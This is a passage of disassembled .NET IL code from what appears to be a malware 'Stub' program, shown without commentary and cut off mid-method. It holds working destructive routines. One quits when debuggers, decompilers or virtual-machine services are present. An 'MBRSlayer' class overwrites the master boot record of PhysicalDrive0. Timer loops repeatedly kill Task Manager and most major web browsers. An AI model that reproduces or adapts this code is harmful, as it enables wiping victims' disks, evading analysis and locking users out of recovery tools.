    IL_01de:  stloc.s    V_23
    IL_01e0:  ldloc.s    V_23
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldlen
    IL_01e5:  conv.i4
    IL_01e6:  blt.s      IL_01cf

    IL_01e8:  ldstr      "dnSpy"
    IL_01ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f2:  stloc.s    V_24
    IL_01f4:  ldc.i4.0
    IL_01f5:  stloc.s    V_25
    IL_01f7:  br.s       IL_020a

    IL_01f9:  ldloc.s    V_24
    IL_01fb:  ldloc.s    V_25
    IL_01fd:  ldelem.ref
    IL_01fe:  pop
    IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0204:  ldloc.s    V_25
    IL_0206:  ldc.i4.1
    IL_0207:  add.ovf
    IL_0208:  stloc.s    V_25
    IL_020a:  ldloc.s    V_25
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldlen
    IL_020f:  conv.i4
    IL_0210:  blt.s      IL_01f9

    IL_0212:  ldstr      "CodeReflect"
    IL_0217:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021c:  stloc.s    V_26
    IL_021e:  ldc.i4.0
    IL_021f:  stloc.s    V_27
    IL_0221:  br.s       IL_0234

    IL_0223:  ldloc.s    V_26
    IL_0225:  ldloc.s    V_27
    IL_0227:  ldelem.ref
    IL_0228:  pop
    IL_0229:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_022e:  ldloc.s    V_27
    IL_0230:  ldc.i4.1
    IL_0231:  add.ovf
    IL_0232:  stloc.s    V_27
    IL_0234:  ldloc.s    V_27
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldlen
    IL_0239:  conv.i4
    IL_023a:  blt.s      IL_0223

    IL_023c:  ldstr      "Reflector"
    IL_0241:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0246:  stloc.s    V_28
    IL_0248:  ldc.i4.0
    IL_0249:  stloc.s    V_29
    IL_024b:  br.s       IL_025e

    IL_024d:  ldloc.s    V_28
    IL_024f:  ldloc.s    V_29
    IL_0251:  ldelem.ref
    IL_0252:  pop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  ldloc.s    V_29
    IL_025a:  ldc.i4.1
    IL_025b:  add.ovf
    IL_025c:  stloc.s    V_29
    IL_025e:  ldloc.s    V_29
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldlen
    IL_0263:  conv.i4
    IL_0264:  blt.s      IL_024d

    IL_0266:  ldstr      "ILSpy"
    IL_026b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0270:  stloc.s    V_30
    IL_0272:  ldc.i4.0
    IL_0273:  stloc.s    V_31
    IL_0275:  br.s       IL_0288

    IL_0277:  ldloc.s    V_30
    IL_0279:  ldloc.s    V_31
    IL_027b:  ldelem.ref
    IL_027c:  pop
    IL_027d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0282:  ldloc.s    V_31
    IL_0284:  ldc.i4.1
    IL_0285:  add.ovf
    IL_0286:  stloc.s    V_31
    IL_0288:  ldloc.s    V_31
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldlen
    IL_028d:  conv.i4
    IL_028e:  blt.s      IL_0277

    IL_0290:  ldstr      "VGAuthService"
    IL_0295:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029a:  stloc.s    V_32
    IL_029c:  ldc.i4.0
    IL_029d:  stloc.s    V_33
    IL_029f:  br.s       IL_02b2

    IL_02a1:  ldloc.s    V_32
    IL_02a3:  ldloc.s    V_33
    IL_02a5:  ldelem.ref
    IL_02a6:  pop
    IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ac:  ldloc.s    V_33
    IL_02ae:  ldc.i4.1
    IL_02af:  add.ovf
    IL_02b0:  stloc.s    V_33
    IL_02b2:  ldloc.s    V_33
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldlen
    IL_02b7:  conv.i4
    IL_02b8:  blt.s      IL_02a1

    IL_02ba:  ldstr      "VBoxService"
    IL_02bf:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c4:  stloc.s    V_34
    IL_02c6:  ldc.i4.0
    IL_02c7:  stloc.s    V_35
    IL_02c9:  br.s       IL_02dc

    IL_02cb:  ldloc.s    V_34
    IL_02cd:  ldloc.s    V_35
    IL_02cf:  ldelem.ref
    IL_02d0:  pop
    IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d6:  ldloc.s    V_35
    IL_02d8:  ldc.i4.1
    IL_02d9:  add.ovf
    IL_02da:  stloc.s    V_35
    IL_02dc:  ldloc.s    V_35
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldlen
    IL_02e1:  conv.i4
    IL_02e2:  blt.s      IL_02cb

    IL_02e4:  ret
  } // end of method MyAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     5.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.MyAntiProcess::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.MyAntiProcess::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.MyAntiProcess::Handler(object,
                                                          class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.MyAntiProcess::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method MyAntiProcess::Start

} // end of class Stub.MyAntiProcess

.class public auto ansi Stub.MBRSlayer
       extends [mscorlib]System.Object
{
  .field private static literal uint32 GenericWrite = uint32(0x40000000)
  .field private static literal uint32 GenericExecute = uint32(0x20000000)
  .field private static literal uint32 GenericAll = uint32(0x10000000)
  .field private static literal uint32 FileShareRead = uint32(0x00000001)
  .field private static literal uint32 FileShareWrite = uint32(0x00000002)
  .field private static literal uint32 OpenExisting = uint32(0x00000003)
  .field private static literal uint32 FileFlagDeleteOnClose = uint32(0x40000000)
  .field private static literal uint32 MbrSize = uint32(0x00000200)
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method MBRSlayer::.ctor

  .method public static pinvokeimpl("kernel32" winapi) 
          native int  CreateFile(string lpFileName,
                                 uint32 dwDesiredAccess,
                                 uint32 dwShareMode,
                                 native int lpSecurityAttributes,
                                 uint32 dwCreationDisposition,
                                 uint32 dwFlagsAndAttributes,
                                 native int hTemplateFile) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("kernel32" winapi) 
          bool  WriteFile(native int hfile,
                          uint8[] lpBuffer,
                          uint32 nNumberOfBytesToWrite,
                          [out] uint32& lpNumberBytesWritten,
                          native int lpOverlapped) cil managed preservesig
  {
  }
  .method public static void  Start() cil managed
  {
    // Code size       234 (0xea)
    .maxstack  7
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             object V_4,
             uint32 V_5,
             native int V_6)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldc.i4     0x200
      IL_000e:  newarr     [mscorlib]System.Byte
      IL_0013:  dup
      IL_0014:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=512' '<PrivateImplementationDetails>'::'462E13B612D5A6C3EC8AB25DF69755AD20BF51EF'
      IL_0019:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_001e:  stloc.3
      IL_001f:  ldc.i4.3
      IL_0020:  stloc.2
      IL_0021:  ldstr      "\\\\.\\PhysicalDrive0"
      IL_0026:  ldc.i4     0x10000000
      IL_002b:  ldc.i4.3
      IL_002c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0031:  ldc.i4.3
      IL_0032:  ldc.i4.0
      IL_0033:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0038:  call       native int Stub.MBRSlayer::CreateFile(string,
                                                                 uint32,
                                                                 uint32,
                                                                 native int,
                                                                 uint32,
                                                                 uint32,
                                                                 native int)
      IL_003d:  box        [mscorlib]System.IntPtr
      IL_0042:  stloc.s    V_4
      IL_0044:  ldc.i4.4
      IL_0045:  stloc.2
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.s    V_5
      IL_0049:  ldc.i4.5
      IL_004a:  stloc.2
      IL_004b:  ldloc.s    V_4
      IL_004d:  dup
      IL_004e:  brtrue.s   IL_005d

      IL_0050:  pop
      IL_0051:  ldloca.s   V_6
      IL_0053:  initobj    [mscorlib]System.IntPtr
      IL_0059:  ldloc.s    V_6
      IL_005b:  br.s       IL_0062

      IL_005d:  unbox.any  [mscorlib]System.IntPtr
      IL_0062:  ldloc.3
      IL_0063:  castclass  uint8[]
      IL_0068:  ldc.i4     0x200
      IL_006d:  ldloca.s   V_5
      IL_006f:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0074:  call       bool Stub.MBRSlayer::WriteFile(native int,
                                                          uint8[],
                                                          uint32,
                                                          uint32&,
                                                          native int)
      IL_0079:  pop
      IL_007a:  leave.s    IL_00e1

      IL_007c:  ldloc.1
      IL_007d:  ldc.i4.1
      IL_007e:  add
      IL_007f:  ldc.i4.0
      IL_0080:  stloc.1
      IL_0081:  switch     ( 
                            IL_00a2,
                            IL_0000,
                            IL_0007,
                            IL_001f,
                            IL_0044,
                            IL_0049,
                            IL_007a)
      IL_00a2:  leave.s    IL_00d6

      IL_00a4:  ldloc.2
      IL_00a5:  stloc.1
      IL_00a6:  ldloc.0
      IL_00a7:  switch     ( 
                            IL_00b4,
                            IL_007c)
      IL_00b4:  leave.s    IL_00d6

    }  // end .try
    filter
    {
      IL_00b6:  isinst     [mscorlib]System.Exception
      IL_00bb:  ldnull
      IL_00bc:  cgt.un
      IL_00be:  ldloc.0
      IL_00bf:  ldc.i4.0
      IL_00c0:  cgt.un
      IL_00c2:  and
      IL_00c3:  ldloc.1
      IL_00c4:  ldc.i4.0
      IL_00c5:  ceq
      IL_00c7:  and
      IL_00c8:  endfilter
    }  // end filter
    {  // handler
      IL_00ca:  castclass  [mscorlib]System.Exception
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  leave.s    IL_00a4

    }  // end handler
    IL_00d6:  ldc.i4     0x800a0033
    IL_00db:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00e0:  throw

    IL_00e1:  ldloc.1
    IL_00e2:  brfalse.s  IL_00e9

    IL_00e4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00e9:  ret
  } // end of method MBRSlayer::Start

} // end of class Stub.MBRSlayer

.class public auto ansi Stub.xma
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer xTimer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method xma::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       52 (0x34)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldstr      "taskmgr"
    IL_0005:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_000a:  stloc.1
    IL_000b:  ldc.i4.0
    IL_000c:  stloc.2
    IL_000d:  br.s       IL_002d

    IL_000f:  ldloc.1
    IL_0010:  ldloc.2
    IL_0011:  ldelem.ref
    IL_0012:  stloc.0
    .try
    {
      IL_0013:  ldloc.0
      IL_0014:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0019:  leave.s    IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001b:  dup
      IL_001c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0021:  stloc.3
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0027:  leave.s    IL_0029

    }  // end handler
    IL_0029:  ldloc.2
    IL_002a:  ldc.i4.1
    IL_002b:  add.ovf
    IL_002c:  stloc.2
    IL_002d:  ldloc.2
    IL_002e:  ldloc.1
    IL_002f:  ldlen
    IL_0030:  conv.i4
    IL_0031:  blt.s      IL_000f

    IL_0033:  ret
  } // end of method xma::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     250.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer Stub.xma::xTimer
    IL_0013:  ldsfld     class [System]System.Timers.Timer Stub.xma::xTimer
    IL_0018:  ldnull
    IL_0019:  ldftn      void Stub.xma::Handler(object,
                                                class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer Stub.xma::xTimer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method xma::Start

} // end of class Stub.xma

.class public auto ansi Stub.xxma
       extends [mscorlib]System.Object
{
  .field private static class [System]System.Timers.Timer xTimer
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method xxma::.ctor

  .method public static void  Handler(object sender,
                                      class [System]System.Timers.ElapsedEventArgs e) cil managed
  {
    // Code size       820 (0x334)
    .maxstack  3
    .locals init (class [System]System.Diagnostics.Process V_0,
             class [System]System.Diagnostics.Process V_1,
             class [System]System.Diagnostics.Process V_2,
             class [System]System.Diagnostics.Process V_3,
             class [System]System.Diagnostics.Process V_4,
             class [System]System.Diagnostics.Process V_5,
             class [System]System.Diagnostics.Process V_6,
             class [System]System.Diagnostics.Process V_7,
             class [System]System.Diagnostics.Process V_8,
             class [System]System.Diagnostics.Process V_9,
             class [System]System.Diagnostics.Process V_10,
             class [System]System.Diagnostics.Process V_11,
             class [System]System.Diagnostics.Process V_12,
             class [System]System.Diagnostics.Process[] V_13,
             int32 V_14,
             class [mscorlib]System.Exception V_15,
             class [System]System.Diagnostics.Process[] V_16,
             int32 V_17,
             class [mscorlib]System.Exception V_18,
             class [System]System.Diagnostics.Process[] V_19,
             int32 V_20,
             class [mscorlib]System.Exception V_21,
             class [System]System.Diagnostics.Process[] V_22,
             int32 V_23,
             class [mscorlib]System.Exception V_24,
             class [System]System.Diagnostics.Process[] V_25,
             int32 V_26,
             class [mscorlib]System.Exception V_27,
             class [System]System.Diagnostics.Process[] V_28,
             int32 V_29,
             class [mscorlib]System.Exception V_30,
             class [System]System.Diagnostics.Process[] V_31,
             int32 V_32,
             class [mscorlib]System.Exception V_33,
             class [System]System.Diagnostics.Process[] V_34,
             int32 V_35,
             class [mscorlib]System.Exception V_36,
             class [System]System.Diagnostics.Process[] V_37,
             int32 V_38,
             class [mscorlib]System.Exception V_39,
             class [System]System.Diagnostics.Process[] V_40,
             int32 V_41,
             class [mscorlib]System.Exception V_42,
             class [System]System.Diagnostics.Process[] V_43,
             int32 V_44,
             class [mscorlib]System.Exception V_45,
             class [System]System.Diagnostics.Process[] V_46,
             int32 V_47,
             class [mscorlib]System.Exception V_48,
             class [System]System.Diagnostics.Process[] V_49,
             int32 V_50,
             class [mscorlib]System.Exception V_51)
    IL_0000:  ldsfld     string j.OK::nowifi
    IL_0005:  ldstr      "on"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  brtrue     IL_0333

    IL_0015:  ldstr      "Chrome"
    IL_001a:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_001f:  stloc.s    V_13
    IL_0021:  ldc.i4.0
    IL_0022:  stloc.s    V_14
    IL_0024:  br.s       IL_0049

    IL_0026:  ldloc.s    V_13
    IL_0028:  ldloc.s    V_14
    IL_002a:  ldelem.ref
    IL_002b:  stloc.0
    .try
    {
      IL_002c:  ldloc.0
      IL_002d:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0032:  leave.s    IL_0043

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0034:  dup
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  stloc.s    V_15
      IL_003c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0041:  leave.s    IL_0043

    }  // end handler
    IL_0043:  ldloc.s    V_14
    IL_0045:  ldc.i4.1
    IL_0046:  add.ovf
    IL_0047:  stloc.s    V_14
    IL_0049:  ldloc.s    V_14
    IL_004b:  ldloc.s    V_13
    IL_004d:  ldlen
    IL_004e:  conv.i4
    IL_004f:  blt.s      IL_0026

    IL_0051:  ldstr      "Firefox"
    IL_0056:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_005b:  stloc.s    V_16
    IL_005d:  ldc.i4.0
    IL_005e:  stloc.s    V_17
    IL_0060:  br.s       IL_0085

    IL_0062:  ldloc.s    V_16
    IL_0064:  ldloc.s    V_17
    IL_0066:  ldelem.ref
    IL_0067:  stloc.1
    .try
    {
      IL_0068:  ldloc.1
      IL_0069:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_006e:  leave.s    IL_007f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0070:  dup
      IL_0071:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0076:  stloc.s    V_18
      IL_0078:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_007d:  leave.s    IL_007f

    }  // end handler
    IL_007f:  ldloc.s    V_17
    IL_0081:  ldc.i4.1
    IL_0082:  add.ovf
    IL_0083:  stloc.s    V_17
    IL_0085:  ldloc.s    V_17
    IL_0087:  ldloc.s    V_16
    IL_0089:  ldlen
    IL_008a:  conv.i4
    IL_008b:  blt.s      IL_0062

    IL_008d:  ldstr      "Chromium"
    IL_0092:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0097:  stloc.s    V_19
    IL_0099:  ldc.i4.0
    IL_009a:  stloc.s    V_20
    IL_009c:  br.s       IL_00c1

    IL_009e:  ldloc.s    V_19
    IL_00a0:  ldloc.s    V_20
    IL_00a2:  ldelem.ref
    IL_00a3:  stloc.2
    .try
    {
      IL_00a4:  ldloc.2
      IL_00a5:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_00aa:  leave.s    IL_00bb

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ac:  dup
      IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b2:  stloc.s    V_21
      IL_00b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00b9:  leave.s    IL_00bb

    }  // end handler
    IL_00bb:  ldloc.s    V_20
    IL_00bd:  ldc.i4.1
    IL_00be:  add.ovf
    IL_00bf:  stloc.s    V_20
    IL_00c1:  ldloc.s    V_20
    IL_00c3:  ldloc.s    V_19
    IL_00c5:  ldlen
    IL_00c6:  conv.i4
    IL_00c7:  blt.s      IL_009e

    IL_00c9:  ldstr      "Opera"
    IL_00ce:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00d3:  stloc.s    V_22
    IL_00d5:  ldc.i4.0
    IL_00d6:  stloc.s    V_23
    IL_00d8:  br.s       IL_00fd

    IL_00da:  ldloc.s    V_22
    IL_00dc:  ldloc.s    V_23
    IL_00de:  ldelem.ref
    IL_00df:  stloc.3
    .try
    {
      IL_00e0:  ldloc.3
      IL_00e1:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_00e6:  leave.s    IL_00f7

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00e8:  dup
      IL_00e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00ee:  stloc.s    V_24
      IL_00f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f5:  leave.s    IL_00f7

    }  // end handler
    IL_00f7:  ldloc.s    V_23
    IL_00f9:  ldc.i4.1
    IL_00fa:  add.ovf
    IL_00fb:  stloc.s    V_23
    IL_00fd:  ldloc.s    V_23
    IL_00ff:  ldloc.s    V_22
    IL_0101:  ldlen
    IL_0102:  conv.i4
    IL_0103:  blt.s      IL_00da

    IL_0105:  ldstr      "OperaGX"
    IL_010a:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_010f:  stloc.s    V_25
    IL_0111:  ldc.i4.0
    IL_0112:  stloc.s    V_26
    IL_0114:  br.s       IL_013b

    IL_0116:  ldloc.s    V_25
    IL_0118:  ldloc.s    V_26
    IL_011a:  ldelem.ref
    IL_011b:  stloc.s    V_4
    .try
    {
      IL_011d:  ldloc.s    V_4
      IL_011f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0124:  leave.s    IL_0135

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0126:  dup
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012c:  stloc.s    V_27
      IL_012e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0133:  leave.s    IL_0135

    }  // end handler
    IL_0135:  ldloc.s    V_26
    IL_0137:  ldc.i4.1
    IL_0138:  add.ovf
    IL_0139:  stloc.s    V_26
    IL_013b:  ldloc.s    V_26
    IL_013d:  ldloc.s    V_25
    IL_013f:  ldlen
    IL_0140:  conv.i4
    IL_0141:  blt.s      IL_0116

    IL_0143:  ldstr      "MSEdge"
    IL_0148:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_014d:  stloc.s    V_28
    IL_014f:  ldc.i4.0
    IL_0150:  stloc.s    V_29
    IL_0152:  br.s       IL_0179

    IL_0154:  ldloc.s    V_28
    IL_0156:  ldloc.s    V_29
    IL_0158:  ldelem.ref
    IL_0159:  stloc.s    V_5
    .try
    {
      IL_015b:  ldloc.s    V_5
      IL_015d:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_0162:  leave.s    IL_0173

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0164:  dup
      IL_0165:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016a:  stloc.s    V_30
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  leave.s    IL_0173

    }  // end handler
    IL_0173:  ldloc.s    V_29
    IL_0175:  ldc.i4.1
    IL_0176:  add.ovf
    IL_0177:  stloc.s    V_29
    IL_0179:  ldloc.s    V_29
    IL_017b:  ldloc.s    V_28
    IL_017d:  ldlen
    IL_017e:  conv.i4
    IL_017f:  blt.s      IL_0154

    IL_0181:  ldstr      "Safari"
    IL_0186:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_018b:  stloc.s    V_31
    IL_018d:  ldc.i4.0
    IL_018e:  stloc.s    V_32
    IL_0190:  br.s       IL_01b7

    IL_0192:  ldloc.s    V_31
    IL_0194:  ldloc.s    V_32
    IL_0196:  ldelem.ref
    IL_0197:  stloc.s    V_6
    .try
    {
      IL_0199:  ldloc.s    V_6
      IL_019b:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_01a0:  leave.s    IL_01b1

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a2:  dup
      IL_01a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a8:  stloc.s    V_33
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01af:  leave.s    IL_01b1

    }  // end handler
    IL_01b1:  ldloc.s    V_32
    IL_01b3:  ldc.i4.1
    IL_01b4:  add.ovf
    IL_01b5:  stloc.s    V_32
    IL_01b7:  ldloc.s    V_32
    IL_01b9:  ldloc.s    V_31
    IL_01bb:  ldlen
    IL_01bc:  conv.i4
    IL_01bd:  blt.s      IL_0192

    IL_01bf:  ldstr      "Brave"
    IL_01c4:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c9:  stloc.s    V_34
    IL_01cb:  ldc.i4.0
    IL_01cc:  stloc.s    V_35
    IL_01ce:  br.s       IL_01f5

    IL_01d0:  ldloc.s    V_34
    IL_01d2:  ldloc.s    V_35
    IL_01d4:  ldelem.ref
    IL_01d5:  stloc.s    V_7
    .try
    {
      IL_01d7:  ldloc.s    V_7
      IL_01d9:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_01de:  leave.s    IL_01ef

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01e0:  dup
      IL_01e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01e6:  stloc.s    V_36
      IL_01e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ed:  leave.s    IL_01ef

    }  // end handler
    IL_01ef:  ldloc.s    V_35
    IL_01f1:  ldc.i4.1
    IL_01f2:  add.ovf
    IL_01f3:  stloc.s    V_35
    IL_01f5:  ldloc.s    V_35
    IL_01f7:  ldloc.s    V_34
    IL_01f9:  ldlen
    IL_01fa:  conv.i4
    IL_01fb:  blt.s      IL_01d0

    IL_01fd:  ldstr      "Iridium"
    IL_0202:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0207:  stloc.s    V_37
    IL_0209:  ldc.i4.0
    IL_020a:  stloc.s    V_38
    IL_020c:  br.s       IL_0233

    IL_020e:  ldloc.s    V_37
    IL_0210:  ldloc.s    V_38
    IL_0212:  ldelem.ref
    IL_0213:  stloc.s    V_8
    .try
    {
      IL_0215:  ldloc.s    V_8
      IL_0217:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_021c:  leave.s    IL_022d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_021e:  dup
      IL_021f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0224:  stloc.s    V_39
      IL_0226:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_022b:  leave.s    IL_022d

    }  // end handler
    IL_022d:  ldloc.s    V_38
    IL_022f:  ldc.i4.1
    IL_0230:  add.ovf
    IL_0231:  stloc.s    V_38
    IL_0233:  ldloc.s    V_38
    IL_0235:  ldloc.s    V_37
    IL_0237:  ldlen
    IL_0238:  conv.i4
    IL_0239:  blt.s      IL_020e

